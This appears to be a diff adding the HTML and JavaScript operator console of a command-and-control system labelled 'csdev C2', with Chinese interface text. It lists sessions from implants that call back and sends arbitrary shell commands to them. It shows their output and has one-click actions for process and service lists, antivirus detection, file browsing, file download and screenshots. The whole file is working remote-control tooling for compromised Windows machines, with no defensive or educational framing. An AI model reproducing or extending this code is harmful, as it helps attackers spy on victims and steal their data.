@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>csdev C2</title>
+<style>
+:root{
+  --bg:#0b0e14; --panel:#11151c; --panel2:#171c26; --panel3:#1d232f;
+  --line:#242b38; --fg:#d5dae3; --dim:#6e7a8f; --accent:#4a9eff;
+  --accent2:#2d7dd2; --ok:#3fb950; --warn:#d29922; --err:#f85149;
+  --mono:'Cascadia Code','JetBrains Mono','Fira Code',Consolas,monospace;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%}
+body{background:var(--bg);color:var(--fg);font:13px/1.55 -apple-system,'Segoe UI','Microsoft YaHei UI',sans-serif;display:flex;flex-direction:column;overflow:hidden}
+
+/* 顶栏 */
+header{height:50px;background:var(--panel);border-bottom:1px solid var(--line);display:flex;align-items:center;gap:18px;padding:0 20px;flex-shrink:0}
+.logo{font-family:var(--mono);font-size:15px;font-weight:700;letter-spacing:.5px}
+.logo i{color:var(--accent);font-style:normal}
+.logo em{color:var(--dim);font-style:normal;font-weight:400;font-size:12px;margin-left:6px}
+.pill{font-size:11px;padding:3px 10px;border-radius:20px;background:var(--panel2);border:1px solid var(--line);font-family:var(--mono)}
+.pill b{color:var(--accent);font-weight:600}
+.dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:6px;vertical-align:middle}
+.dot.on{background:var(--ok);box-shadow:0 0 8px var(--ok)}
+.dot.off{background:var(--err);box-shadow:0 0 8px var(--err)}
+header .sp{flex:1}
+
+/* 布局 */
+main{flex:1;display:flex;min-height:0}
+aside{width:290px;background:var(--panel);border-right:1px solid var(--line);display:flex;flex-direction:column;flex-shrink:0}
+.side-h{padding:14px 18px 10px;font-size:10px;letter-spacing:1.4px;color:var(--dim);text-transform:uppercase;font-weight:600}
+#list{flex:1;overflow-y:auto}
+.card{margin:0 10px 8px;padding:11px 13px;background:var(--panel2);border-radius:8px;border:1px solid transparent;cursor:pointer;transition:.12s}
+.card:hover{background:var(--panel3)}
+.card.sel{border-color:var(--accent);background:var(--panel3)}
+.card .h{display:flex;align-items:center;gap:8px;font-weight:600;font-size:13px;margin-bottom:4px}
+.card .m{font-family:var(--mono);font-size:11px;color:var(--dim)}
+.card .r{display:flex;gap:8px;margin-top:6px;font-family:var(--mono);font-size:10px;color:var(--accent)}
+.card .r span{background:var(--bg);padding:1px 6px;border-radius:3px}
+
+section{flex:1;display:flex;flex-direction:column;min-width:0;background:var(--bg)}
+.tabs{height:42px;background:var(--panel);border-bottom:1px solid var(--line);display:flex;align-items:flex-end;gap:2px;padding:0 14px;flex-shrink:0}
+.tab{padding:9px 18px;font-size:12px;color:var(--dim);cursor:pointer;border-bottom:2px solid transparent;transition:.15s;font-weight:500}
+.tab:hover{color:var(--fg)}
+.tab.on{color:var(--accent);border-bottom-color:var(--accent)}
+
+.pane{flex:1;display:none;min-height:0;flex-direction:column}
+.pane.on{display:flex}
+
+/* 终端 */
+#term{flex:1;overflow-y:auto;padding:16px 20px;font-family:var(--mono);font-size:12.5px;white-space:pre-wrap;word-break:break-all;line-height:1.6}
+#term .l{margin-bottom:1px}
+#term .l.c{color:var(--accent);font-weight:600}
+#term .l.s{color:var(--dim);font-style:italic}
+#term .l.e{color:var(--err)}
+.bar{display:flex;gap:8px;padding:10px 14px;background:var(--panel);border-top:1px solid var(--line);flex-shrink:0}
+.bar input{flex:1;background:var(--panel2);border:1px solid var(--line);color:var(--fg);padding:9px 13px;border-radius:6px;font-family:var(--mono);font-size:12.5px;outline:none;transition:.15s}
+.bar input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(74,158,255,.1)}
+.bar button{background:var(--accent);color:#0b0e14;border:0;padding:9px 22px;border-radius:6px;font-weight:700;cursor:pointer;font-size:12.5px;transition:.15s;font-family:inherit}
+.bar button:hover{background:var(--accent2)}
+.bar button.gh{background:var(--panel2);color:var(--fg);border:1px solid var(--line)}
+.bar button.gh:hover{background:var(--panel3)}
+
+/* 表格 */
+.tw{flex:1;overflow:auto;padding:12px 16px}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{text-align:left;padding:9px 12px;color:var(--dim);font-weight:600;font-size:10.5px;letter-spacing:.8px;text-transform:uppercase;border-bottom:1px solid var(--line);position:sticky;top:0;background:var(--bg)}
+td{padding:7px 12px;border-bottom:1px solid var(--line);font-family:var(--mono);font-size:11.5px}
+tr:hover td{background:var(--panel2)}
+td.pid{color:var(--accent);width:90px;text-align:right}
+
+.empty{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;color:var(--dim)}
+.empty .ic{font-size:44px;opacity:.18}
+.empty .t{font-size:13px}
+
+#toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(80px);background:var(--panel3);border:1px solid var(--line);color:var(--fg);padding:11px 22px;border-radius:8px;font-size:12.5px;transition:.25s;opacity:0;pointer-events:none;box-shadow:0 8px 28px rgba(0,0,0,.5)}
+#toast.on{transform:translateX(-50%) translateY(0);opacity:1}
+::-webkit-scrollbar{width:9px;height:9px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--line);border-radius:5px}
+::-webkit-scrollbar-thumb:hover{background:#333c4d}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">csdev<i> C2</i><em>console</em></div>
+  <div class="pill"><span class="dot on" id="sd"></span><span id="st">连接中</span></div>
+  <div class="pill">会话 <b id="cnt">0</b></div>
+  <div class="sp"></div>
+  <div class="pill" id="clk"></div>
+</header>
+
+<main>
+  <aside>
+    <div class="side-h">会话列表</div>
+    <div id="list"></div>
+  </aside>
+
+  <section>
+    <div class="tabs">
+      <div class="tab on" data-p="t1">终端</div>
+      <div class="tab" data-p="t2">进程</div>
+      <div class="tab" data-p="t3">文件</div>
+    </div>
+
+    <div class="pane on" id="pane-t1">
+      <div id="term"></div>
+      <div class="bar">
+        <input id="cin" placeholder="输入命令，回车执行…" autocomplete="off" spellcheck="false">
+        <button onclick="send()">执行</button>
+      </div>
+    </div>
+
+    <div class="pane" id="pane-t2">
+      <div class="bar">
+        <button class="gh" onclick="qs('ps')">刷新进程</button>
+        <button class="gh" onclick="qs('tasklist')">详细列表</button>
+        <button class="gh" onclick="qs('services')">服务</button>
+        <button class="gh" onclick="qs('av')">杀软</button>
+      </div>
+      <div class="tw"><table><thead><tr><th>PID</th><th>名称</th></tr></thead><tbody id="procs"></tbody></table></div>
+    </div>
+
+    <div class="pane" id="pane-t3">
+      <div class="bar">
+        <input id="fpath" value="C:\" style="font-family:var(--mono)">
+        <button class="gh" onclick="qs('ls '+document.getElementById('fpath').value)">列出</button>
+        <button class="gh" onclick="qs('drives')">磁盘</button>
+        <button class="gh" onclick="dl()">下载</button>
+        <button class="gh" onclick="qs('screenshot')">截屏</button>
+      </div>
+      <div id="term3" style="flex:1;overflow-y:auto;padding:16px 20px;font-family:var(--mono);font-size:12.5px;white-space:pre-wrap;word-break:break-all;line-height:1.6"></div>
+    </div>
+  </section>
+</main>
+
+<div id="toast"></div>
+
+<script>
+let SESS = {}, CUR = null, SINCE = 0, HIST = [], HI = -1;
+
+const $ = id => document.getElementById(id);
+const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+
+function toast(msg){
+  const t = $('toast'); t.textContent = msg; t.classList.add('on');
+  setTimeout(()=>t.classList.remove('on'), 1800);
+}
+
+// ---- 标签切换 ----
+document.querySelectorAll('.tab').forEach(t => {
+  t.onclick = () => {
+    document.querySelectorAll('.tab').forEach(x=>x.classList.remove('on'));
+    document.querySelectorAll('.pane').forEach(x=>x.classList.remove('on'));
+    t.classList.add('on');
+    $('pane-' + t.dataset.p).classList.add('on');
+  };
+});
+
+// ---- 会话轮询 ----
+async function pollSess(){
+  try{
+    const r = await fetch('/api/sessions');
+    const j = await r.json();
+    $('sd').className = 'dot on';
+    $('st').textContent = '在线';
+    const list = j.sessions || [];
+    $('cnt').textContent = list.length;
+    SESS = {}; list.forEach(s => SESS[s.sid] = s);
+
+    let h = '';
+    if(!list.length){
+      h = '<div class="empty" style="padding:40px 10px"><div class="ic">◈</div><div class="t">等待植入体回连</div></div>';
+    } else {
+      for(const s of list){
+        const cls = s.sid === CUR ? 'card sel' : 'card';
+        h += `<div class="${cls}" onclick="pick('${s.sid}')">
+          <div class="h"><span class="dot on"></span>${esc(s.host)}</div>
+          <div class="m">${esc(s.user)}@${esc(s.host)}</div>
+          <div class="r"><span>${s.sid}</span><span>${esc(s.arch)}</span><span>${s.idle}s</span></div>
+        </div>`;
+      }
+    }
+    $('list').innerHTML = h;
+  }catch(e){
+    $('sd').className = 'dot off';
+    $('st').textContent = '服务端离线';
+  }
+}
+
+function pick(sid){
+  if(CUR !== sid){ CUR = sid; SINCE = 0; $('term').innerHTML = ''; $('term3').innerHTML = ''; $('procs').innerHTML = ''; }
+  pollSess();
+}
+
+// ---- 输出轮询 ----
+let psBuf = '';
+async function pollOut(){
+  if(!CUR) return;
+  try{
+    const r = await fetch(`/api/output?sid=${CUR}&since=${SINCE}`);
+    const j = await r.json();
+    if(!j.ok || !j.items || !j.items.length) return;
+    const t = $('term'), t3 = $('term3');
+    for(const it of j.items){
+      SINCE = Math.max(SINCE, it.ts);
+      let txt;
+      try {
+        const raw = atob(it.text);
+        const bytes = new Uint8Array(raw.length);
+        for (let k = 0; k < raw.length; k++) bytes[k] = raw.charCodeAt(k);
+        // 双来源: 服务端生成的文本是 UTF-8, 植入体回传的是 GBK。
+        // 先以 fatal 模式试 UTF-8, 抛错则说明是 GBK。
+        try {
+          txt = new TextDecoder('utf-8', {fatal: true}).decode(bytes);
+        } catch (e2) {
+          txt = new TextDecoder('gbk').decode(bytes);
+        }
+      } catch (e) { txt = String(it.text); }
+      txt = txt.replace(/\r/g, '');
+      if(txt.startsWith('> ')) continue;
+      const d = document.createElement('div');
+      d.className = 'l';
+      d.textContent = txt;
+      t.appendChild(d);
+      // 进程表识别
+      if(/\t/.test(txt)){
+        for(const line of txt.split('\n')){
+          const p = line.split('\t');
+          if(p.length >= 2 && /^\d+$/.test(p[0].trim())){
+            const tr = document.createElement('tr');
+            tr.innerHTML = `<td class="pid">${esc(p[0].trim())}</td><td>${esc(p[1].trim())}</td>`;
+            $('procs').appendChild(tr);
+          }
+        }
+      }
+      psBuf += txt;
+    }
+    t.scrollTop = t.scrollHeight;
+    // 文件页也同步显示 (便于查看 ls/dir 输出)
+    if(t3 && /目录|Volume|驱动器|Directory/.test(psBuf.slice(-2000))){
+      t3.innerHTML = '';
+      const d = document.createElement('div');
+      d.textContent = psBuf.slice(-8000);
+      t3.appendChild(d);
+      t3.scrollTop = t3.scrollHeight;
+    }
+  }catch(e){}
+}
+
+// ---- 命令 ----
+async function send(){
+  const el = $('cin');
+  const cmd = el.value.trim();
+  if(!cmd || !CUR){ if(!CUR) toast('请先选择会话'); return; }
+  el.value = '';
+  HIST.push(cmd); HI = HIST.length;
+  addLocal('> ' + cmd, 'c');
+  const r = await fetch('/api/command', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({sid: CUR, cmd})
+  });
+  const j = await r.json();
+  if(!j.ok) toast('下发失败: ' + (j.error||''));
+}
+
+function qs(cmd){
+  if(!CUR){ toast('请先选择会话'); return; }
+  addLocal('> ' + cmd, 'c');
+  fetch('/api/command', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({sid: CUR, cmd})
+  });
+}
+
+function addLocal(txt, cls){
+  const d = document.createElement('div');
+  d.className = 'l ' + (cls||'');
+  d.textContent = txt;
+  $('term').appendChild(d);
+  $('term').scrollTop = $('term').scrollHeight;
+}
+
+function dl(){
+  const p = prompt('输入要下载的完整路径:');
+  if(p) qs('download ' + p);
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  $('cin').addEventListener('keydown', e => {
+    if(e.key === 'Enter'){ send(); }
+    else if(e.key === 'ArrowUp'){ if(HI > 0){ HI--; $('cin').value = HIST[HI]; } e.preventDefault(); }
+    else if(e.key === 'ArrowDown'){ if(HI < HIST.length-1){ HI++; $('cin').value = HIST[HI]; } else { HI = HIST.length; $('cin').value = ''; } e.preventDefault(); }
+  });
+  setInterval(()=>{ $('clk').textContent = new Date().toLocaleTimeString('zh-CN'); }, 1000);
+  setInterval(pollSess, 2000);
+  setInterval(pollOut, 900);
+  pollSess();
+});
+</script>
+</body>
+</html>
